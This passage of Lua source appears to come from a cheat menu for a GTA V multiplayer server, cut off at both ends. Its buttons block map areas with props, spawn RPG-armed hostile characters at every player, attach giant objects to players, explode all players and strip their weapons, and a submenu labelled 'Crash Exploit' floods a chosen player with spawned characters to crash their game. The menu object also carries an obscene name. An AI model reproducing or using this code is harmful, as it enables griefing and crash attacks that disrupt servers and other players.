                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
					local cd1 = CreateObject(e8, -50.97, -1066.92, 26.52, true, true, false)
					local cd2 = CreateObject(e8, -63.86, -1099.05, 25.26, true, true, false)
					local cd3 = CreateObject(e8, -44.13, -1129.49, 25.07, true, true, false)
                    SetEntityHeading(cd1, 160.59)
                    SetEntityHeading(cd2, 216.98)
					SetEntityHeading(cd3, 291.74)
                    FreezeEntityPosition(cd1, true)
                    FreezeEntityPosition(cd2, true)
					FreezeEntityPosition(cd3, true)
			elseif IhadSexWithMyStepMother.Button("~r~CLOSE - Police Department MAP") then
			x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
					local pd1 = CreateObject(e8, 439.43, -965.49, 27.05, true, true, false)
                    local pd2 = CreateObject(e8, 401.04, -1015.15, 27.42, true, true, false)
                    local pd3 = CreateObject(e8, 490.22, -1027.29, 26.18, true, true, false)
                    local pd4 = CreateObject(e8, 491.36, -925.55, 24.48, true, true, false)
                    SetEntityHeading(pd1, 130.75)
                    SetEntityHeading(pd2, 212.63)
                    SetEntityHeading(pd3, 340.06)
                    SetEntityHeading(pd4, 209.57)
                    FreezeEntityPosition(pd1, true)
                    FreezeEntityPosition(pd2, true)
                    FreezeEntityPosition(pd3, true)
                    FreezeEntityPosition(pd4, true)	
			elseif IhadSexWithMyStepMother.Button("~r~CLOSE - The Whole Square MAP") then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
					local e9 = CreateObject(e8, 97.8, -993.22, 28.41, true, true, false)
					local ea = CreateObject(e8, 247.08, -1027.62, 28.26, true, true, false)
					local e92 = CreateObject(e8, 274.51, -833.73, 28.25, true, true, false)
					local ea2 = CreateObject(e8, 291.54, -939.83, 27.41, true, true, false)
					local ea3 = CreateObject(e8, 143.88, -830.49, 30.17, true, true, false)
					local ea4 = CreateObject(e8, 161.97, -768.79, 29.08, true, true, false)
					local ea5 = CreateObject(e8, 151.56, -1061.72, 28.21, true, true, false)
                    SetEntityHeading(e9, 39.79)
                    SetEntityHeading(ea, 128.62)
					SetEntityHeading(e92, 212.1)
					SetEntityHeading(ea2, 179.22)
					SetEntityHeading(ea3, 292.37)
					SetEntityHeading(ea4, 238.46)
					SetEntityHeading(ea5, 61.43)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
					FreezeEntityPosition(e92, true)
					FreezeEntityPosition(ea2, true)
					FreezeEntityPosition(ea3, true)
					FreezeEntityPosition(ea4, true)
                    FreezeEntityPosition(ea5, true)
	elseif IhadSexWithMyStepMother.Button("Spawn Lion ~s~all Players") then
                    local mtlion = "A_C_MtLion"
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
		elseif IhadSexWithMyStepMother.Button("Spawn Naked Peds ~s~To all Players ") then
                    local swat = "a_m_m_acult_01"
					local bR = "weapon_rpg"
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif IhadSexWithMyStepMother.Button("~s~Spawn ~s~Cow ~s~To all Players ") then
                    local swat = "a_c_cow"
					local bR = "weapon_rpg"
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif IhadSexWithMyStepMother.Button("~s~Spawn ~s~Sexy Girls ~s~To all Players ") then
                    local swat = "u_f_y_danceburl_01"
					local bR = "weapon_rpg"
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Arrows') then
				for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'ar_prop_ar_arrow_wide_xl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'ar_prop_ar_arrow_wide_xl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
          elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Tower 8x Very Long ;)') then 
		  for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'ar_prop_ar_cp_tower8x_01a'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'ar_prop_ar_cp_tower8x_01a'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
			elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Walls') then
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'stt_prop_stunt_track_start'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'stt_prop_stunt_track_start'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
	 elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~TUBE Large') then
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'stt_prop_stunt_tube_m'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'stt_prop_stunt_tube_m'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                elseif IhadSexWithMyStepMother.Button('~s~Make all Players ~s~Big Screen') then
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'prop_big_cin_screen'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'prop_big_cin_screen'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                elseif IhadSexWithMyStepMother.Button('Attach Sandy Shores') then
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'cs4_lod_01_slod3'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'cs4_lod_01_slod3'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
            elseif IhadSexWithMyStepMother.Button("Explode All Players") then
                ExplodeAll(includeself)
            elseif IhadSexWithMyStepMother.CheckBox("Explode All Players", ExplodingAll) then
                ExplodingAll = not ExplodingAll
            elseif IhadSexWithMyStepMother.Button("Give All Players Weapons") then
                GiveAllPlayersWeapons(includeself)
            elseif IhadSexWithMyStepMother.Button("Remove All Players Weapons") then
                StripAll(includeself)
            end

			

	
			
			
			elseif IhadSexWithMyStepMother.IsMenuOpened('crashtroll') then
			   if IhadSexWithMyStepMother.Button('Crash Exploit 1') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('ig_wade'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('ig_wade')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
             elseif IhadSexWithMyStepMother.Button('Crash Exploit 2') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('mp_m_freemode_01'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('mp_m_freemode_01')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_m_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
            elseif IhadSexWithMyStepMother.Button('Crash Exploit  3') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('mp_f_freemode_01'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_PISTOL'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
            elseif IhadSexWithMyStepMother.Button('Crash Exploit 4') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('a_m_m_afriamer_01'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('a_m_m_afriamer_01')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('a_m_m_afriamer_01'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_ASSAULTRIFLE'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
          elseif IhadSexWithMyStepMother.Button('Crash Exploit 5') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('mp_f_freemode_01'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_ASSAULTRIFLE'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
        elseif IhadSexWithMyStepMother.Button('Crash Exploit 6') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('mp_f_freemode_01'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('mp_f_freemode_01')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('mp_f_freemode_01'), coords.x, coords.y, coords.z, 0, true, false)
